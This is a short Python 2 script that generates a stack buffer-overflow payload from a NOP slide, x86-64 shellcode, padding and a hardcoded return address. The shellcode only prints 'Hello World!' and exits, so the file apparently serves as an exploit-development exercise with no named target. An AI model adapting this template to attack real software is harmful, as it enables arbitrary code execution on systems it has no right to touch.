#!/usr/bin/python
# Payload generator

## Total payload length
payload_length = 72
## Amount of nops
nop_length = 13
## Controlled memory address to return to in Little Endian format
return_address = '\xd0\xdd\xff\xff\xff\x7f\x00\x00'

## Building the nop slide
nop_slide = "\x90" * nop_length

## Malicious code injection
buf =  ""
buf += "\xeb\x1e\x5e\x48\x31\xc0\xb0\x01\x48\x89\xc7\x48\x89\xfa\x48\x83\xc2\x0e\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05\xe8\xdd\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21"

## Building the padding between buffer overflow start and return address
padding = '\x00' * (payload_length - nop_length - len(buf))
# print "Payload:", payload_length
# print "nop_len:", nop_length
# print "len_buf:", len(buf)
# print "Padd_len:", len(padding)

print nop_slide + buf +  padding + return_address